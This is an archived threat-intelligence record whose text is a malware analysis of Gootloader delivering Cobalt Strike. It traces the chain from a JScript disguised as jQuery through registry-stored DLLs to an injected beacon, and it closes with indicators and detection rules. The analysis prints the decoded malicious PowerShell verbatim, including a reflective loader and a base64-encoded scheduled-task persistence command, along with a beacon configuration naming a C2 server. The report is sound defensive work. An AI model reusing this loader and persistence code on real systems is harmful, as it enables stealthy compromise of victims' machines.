{
    "id": "3c324ea3-0e41-47c6-8909-37311c6de83e",
    "created_at": "2022-10-25T16:48:15.043796Z",
    "updated_at": "2025-03-27T02:09:18.309259Z",
    "deleted_at": null,
    "sha1_hash": "d4d77600fefb201941b4a54013fae7885be04061",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-05-12T09:34:38Z",
    "file_modification_date": "2022-05-12T09:34:40Z",
    "file_size": 651972,
    "plain_text": "### THE GOOT CAUSE\n\n# Gootloader and Cobalt Strike malware analysis\n\n## Analyzing the first-stage JScript\n\nThe first stage of Gootloader on the endpoint is a JScript file extracted from a ZIP file and intended to execute via wscript.exe. While\n\nthese JScript files have been a common Gootloader entry point over the last year, the scripts changed in recent months to masquerade\n\nas legitimate jQuery library files. To achieve this masquerade, the adversary creates scripts by mixing malicious Gootloader code with\n\nbenign jQuery library code, producing a file around 296KB in size.\n\n_[Figure 2: First stage of Gootloader (VT Link)](https://www.virustotal.com/gui/file/ab415370f0033fbddc4ff5fe7de318e6df15b902714b69fbc235db6da41a2348)_\n\n\n-----\n\n[You can clean up the initial script into a deobfuscated script using a tool published by HP’s Threat Research team.](https://github.com/hpthreatresearch/tools/blob/main/gootloader/decode.py)\n\nOnce the script is decoded, you can see the domains contacted by the script to retrieve the next stage. If you have endpoint technologies\n\n[that use AMSI telemetry, you can also spot the decoded script at runtime, like in the instance below.](https://redcanary.com/blog/amsi/)\n\n_Figure 2: Decoded script at runtime_\n\nThis stage of Gootloader queries the value of the USERDNSDOMAIN environment variable. This is a simple check to determine whether\n\nthe affected host is part of an Active Directory domain. This is why you won’t see a lot of sandbox reports with full Gootloader chains of\n\nexecution, since the sandboxes don’t have infrastructure needed for Active Directory-joined hosts. This also means that the malware\n\nspecifically targets business or enterprise victims that use Active Directory. On systems where the check passes, Gootloader pulls down\n\nan additional JScript stage that executes in the same wscript.exe process.\n\n## Analyzing the second-stage JScript\n\nThis stage of JScript contains two Windows DLL files that are encoded into string form. The first is encoded as a hex string that is further\n\nscrambled using substitution with a custom alphabet. The second is only encoded as a hex string. During execution, both of these\n\nstrings are split into chunks and then written into the Windows Registry under the affected user’s HKEY_CURRENT_USER\\SOFTWARE\\\n```\nMicrosoft\\Phone key. The first DLL gets written within a key that bears the user’s name, and the second is written within a key that\n\n```\nhas the user’s name with a zero appended.\n\nExample:\n```\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Phone\\bruce.wayne\\1-9999\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Phone\\bruce.wayne0\\1-500\n\n## The persistent PowerShell code\n\n```\nOnce these payloads are distributed into registry keys, the script executes two PowerShell commands. The first retrieves the .NET DLL\n\nfrom the Windows Registry, reflectively loads it, and executes a function within the DLL named “Test()”.\n```\n614649211;sleep -s 83;$opj=Get-ItemProperty -path (“hk”+”cu:\\sof”+”tw”+”are\\mic”+”ros”+”oft\\\nPhone\\”+[Environment]::(“use”+”rn”+”ame”)+”0”);for ($uo=0;$uo -le 760;$uo++)\n{Try{$mpd+=$opj.$uo}Catch{}};$uo=0;while($true){$uo++;$ko=[math]::(“sq”+”rt”)($uo);if($ko -eq\n1000){break}}$yl=$mpd.replace(“#”,$ko);$kjb=[byte[]]::(“ne”+”w”)($yl.Length/2);for($uo=0;$uo\n-lt $yl.Length;$uo+=2){$kjb[$uo/2]=[convert]::(“ToB”+”yte”)($yl.Substring($uo,2),(2*8))}\n\n```\n[reflection.assembly]::(“Lo”+”ad”)($kjb);[Open]::(“Te”+”st”)();611898544;\n\n_Figure 3: First decoded PowerShell command_\n\n\n-----\n\nThe second PowerShell command establishes persistence via a scheduled task using a combination of cmdlets.\n```\n6876813;$a=”NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQA\nLQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAi\nACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIA\nKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQAr\nACIAMAAiACkA OwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkA\newBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7\nAHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMA\ncQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBh\nAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0A\nWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7\nAGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0A\nMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5\nAHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsA\ncgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAk\nAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUA\nNAA0ADsA”;$u=$env:USERNAME;Register-ScheduledTask $u -In (New-ScheduledTask -Ac (NewScheduledTaskAction -E ([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar\n(“-w h -e “+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));306878516;\n\n```\n_Figure 4: Second decoded PowerShell command_\n\nAt the next logon, the scheduled task executes, reflectively loading the .NET DLL module into memory and calling its\n“Test()” function.\n\nAt this point, the endpoint telemetry shows the instance of PowerShell executing “Test()” establishing network\nconnections but doesn’t show much more detail. To find details on the next stage, you have to dive deeper into the\nloaded .NET DLL. To do this, you can obtain the .NET DLL module from its location in the Windows Registry and\ndecompile it using tools like ILSpy or DNSpy.\n\n## Analyzing the .NET DLL component\n\nIn the .NET DLL module, the adversary implements code to pull an encoded payload from HKEY_CURRENT_USER\\\n```\nSOFTWARE\\Microsoft\\Phone\\bruce.wayne\\1-9999, decodes it into an executable DLL, and then executes its\n\n```\ncontents. The decoding part is fairly straightforward, as the DLL module reads the payload from the registry and uses\ntext replacement operations to remove obfuscation and convert data into a hexadecimal string. Using ILSpy, we could\ndecompile the DLL into its original source to examine.\n\n\n-----\n\n_Figure 5: Text replacement operations_\n\nOnce the code gets converted to the hexadecimal string, it gets converted again into a byte array to become usable. This\nscheme affords the adversaries two layers of obfuscation to prevent security controls from detecting payloads stored in\nthe Windows Registry. This type of obfuscation, though easy to remove during analysis, is enough to stump some tools.\n\n_Figure 6: Byte array conversion_\n\nFinally, the .NET DLL executes the byte array containing the beacon content. It does this using a lot of code borrowed\n[from this open-source project: https://github.com/dretax/DynamicDllLoader.](https://github.com/dretax/DynamicDllLoader)\n\n\n-----\n\nThe .NET code loads the decoded DLL into memory using LoadLibrary(), finds the DLL’s entry point using\n“GetProcAddress()”, and then executes it. After examining the DynamicDllLoader project code next to this Gootloader\ncomponent, we realized that almost all the code outside the deobfuscation algorithm came directly from the\nDynamicDllLoader project.\n\n***Malware analyst’s note: If you want to try analysis on this sample at home, you can use DNSpy or ILSpy to check out**\n[this sample.](https://www.virustotal.com/gui/file/15645d983a3a31e1c3cfe651f2ce5613939f221b2ebeee2a1e2f1aa2ecf94c29)\n\n## Parsing the Cobalt Strike beacon configuration\n\nThe final payload executes in the same PowerShell process loading the .NET DLL. In incidents across three different\ncustomer environments, we observed Cobalt Strike beacons deploying to victim systems, all communicating with the\n[same command and control (C2) address. Pivoting on the C2IP address we observed in VirusTotal, we obtained a beacon](https://www.virustotal.com/gui/file/3d768691d5cb4ae8943d8e57ea83cac1)\n**[DLL for analysis. Using SentinelOne’s CobaltStrikeParser tool, we found the beacon had this configuration:](https://www.virustotal.com/gui/file/3d768691d5cb4ae8943d8e57ea83cac1)**\n```\nBeaconType            - HTTPS\nPort               - 443\nSleepTime            - 60000\nMaxGetSize            - 1048576\nJitter              - 0\nMaxDNS              - Not Found\nPublicKey_MD5          - defb5d95ce99e1ebbf421a1a38d9cb64\nC2Server             - 146.70.78[.]43,/fwlink\nUserAgent            - Mozilla/5.0 (compatible; MSIE 9.0; Windows NT\n6.1; WOW64; Trident/5.0; MATM)\nHttpPostUri           - /submit.php\nMalleable_C2_Instructions    - Empty\nHttpGet_Metadata         - Metadata\n                  base64\n                  header “Cookie”\nHttpPost_Metadata        - ConstHeaders\n                  Content-Type: application/octet-stream\n                  SessionId\n                  parameter “id”\n                  Output\n                  print\nPipeName             - Not Found\nDNS_Idle             - Not Found\nDNS_Sleep            - Not Found\nSSH_Host             - Not Found\nSSH_Port             - Not Found\nSSH_Username           - Not Found\nSSH_Password_Plaintext      - Not Found\nSSH_Password_Pubkey       - Not Found\nSSH_Banner            HttpGet_Verb           - GET\nHttpPost_Verb          - POST\nHttpPostChunk          - 0\nSpawnto_x86           - %windir%\\syswow64\\rundll32.exe\nSpawnto_x64           - %windir%\\sysnative\\rundll32.exe\nCryptoScheme           - 0\n\n```\nProxy_Config           - Not Found\n```\nProxy_User            - Not Found\n\n```\n\n-----\n\n```\nProxy_Password          - Not Found\nProxy_Behavior          - Use IE settings\nWatermark_Hash          - Not Found\nWatermark            - 1580103824\nbStageCleanup          - False\nbCFGCaution           - False\nKillDate             - 0\nbProcInject_StartRWX       - True\nbProcInject_UseRWX        - True\nbProcInject_MinAllocSize     - 0\nProcInject_PrependAppend_x86   - Empty\nProcInject_PrependAppend_x64   - Empty\nProcInject_Execute        - CreateThread\n                  SetThreadContext\n                  CreateRemoteThread\n                  RtlCreateUserThread\nProcInject_AllocationMethod   - VirtualAllocEx\nbUsesCookies           - True\nHostHeader            headersToRemove         - Not Found\nDNS_Beaconing          - Not Found\nDNS_get_TypeA          - Not Found\nDNS_get_TypeAAAA         - Not Found\nDNS_get_TypeTXT         - Not Found\nDNS_put_metadata         - Not Found\nDNS_put_output          - Not Found\nDNS_resolver           - Not Found\nDNS_strategy           - round-robin\nDNS_strategy_rotate_seconds   - -1\nDNS_strategy_fail_x       - -1\nDNS_strategy_fail_seconds    - -1\nRetry_Max_Attempts        - Not Found\nRetry_Increase_Attempts     - Not Found\nRetry_Duration          - Not Found\n\n```\nThe beacon configuration presents an extra detection idea. The “spawnto” properties of the configuration\nspecify rundll32.exe will execute from the beacon as a target to inject into. In this particular configuration,\n```\nrundll32.exe won’t have command-line options. This makes it suspicious because rundll32.exe\n\n```\ncommands usually contain the name of a DLL file to execute. In this case, the beacon executes in a PowerShell\nprocess. The extra detection analytic would be powershell.exe spawning rundll32.exe with no commandline arguments.\n\n## Indicators\n\nWhile the behavioral detection opportunities below provide the most durable method for detecting Gootloader\nand follow-on payloads, we are sharing select indicators from our analysis to assist others in their investigations.\n\n\n-----\n\n|COBALT STRIKE SERVER|146.70.78[.]43|\n|---|---|\n|COBALT STRIKE BEACON|3d768691d5cb4ae8943d8e57ea83cac1|\n|DYNAMICDLLLOADER .NET DLL|244f990d544f1791f0bca6eea140e5d6|\n|SCRIPT STAGE 2 (WRITING BEACON TO REGISTRY)|26480fcc9cf3837629111995b4838137|\n|GOOTLOADER C2|karbonaudit[.]cf|\n|GOOTLOADER C2|kakiosk.adsparkdev[.]com|\n|GOOTLOADER C2|junk-bros[.]com|\n|EXAMPLE GOOTLOADER SCRIPT NAME|sample_gsa_contractor_teaming_agreement 85878.js|\n|GOOTLOADER SCRIPT|261fd5425a60b044c5f9a584473b2a10|\n\n\nRed Canary recommends detecting Gootloader activity to catch this threat early in the intrusion chain. See below for\nopportunities to identify Gootloader and possible follow-on activity in your environment.\n\n## Detection opportunities\n\n\nWINDOWS SCRIPT HOST (wscript.exe) EXECUTING CONTENT FROM A\nUSER’S APPDATA FOLDER\n\nThis detection opportunity identifies the Windows Script Host, wscript.exe, executing a JS\nfile from the user’s AppData folder. This works well to detect instances where a user has doubleclicked into a Gootloader ZIP file and then double-clicked on the JS script to execute it.\n\nprocess == (wscript.exe)\n&&\nprocess_command_line_includes == appdata\\*.js\n\n\n-----\n\nPOWERSHELL (powershell.exe) PERFORMING A REFLECTIVE LOAD OF A\n.NET ASSEMBLY\n\nThis detection opportunity identifies PowerShell loading a .NET assembly into memory for\nexecution using the System.Reflection capabilities of the .NET Framework. This detects\nPowerShell loading the .NET component of Gootloader, as well as multiple additional threats in\nthe wild.\n\nprocess == (powershell.exe)\n&&\nprocess_command_line_includes == Reflection.Assembly AND Load AND byte[]\n\n\nRUNDLL32 (rundll32.exe) WITH NO COMMAND-LINE ARGUMENTS\n\nThis detection opportunity identifies rundll32.exe executing with no command-line arguments\nas an injection target like we usually see for Cobalt Strike beacon injection. The beacon\ndistributed by Gootloader in this instance used rundll32.exe, as do many other beacons\nfound in the wild.\n\nprocess == rundll32.exe\n&&\ncommand_line_includes (“”)*\n&&\n\nhas_network_connection\n||\nhas_child_process\n\n*Note: “” indicates a blank command line.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://redcanary.com/wp-content/uploads/2022/05/Gootloader.pdf"
    ],
    "report_names": [
        "Gootloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1652348078,
    "ts_modification_date": 1652348080,
    "files": {
        "pdf": "https://archive.orkl.eu/d4d77600fefb201941b4a54013fae7885be04061.pdf",
        "text": "https://archive.orkl.eu/d4d77600fefb201941b4a54013fae7885be04061.txt",
        "img": "https://archive.orkl.eu/d4d77600fefb201941b4a54013fae7885be04061.jpg"
    }
}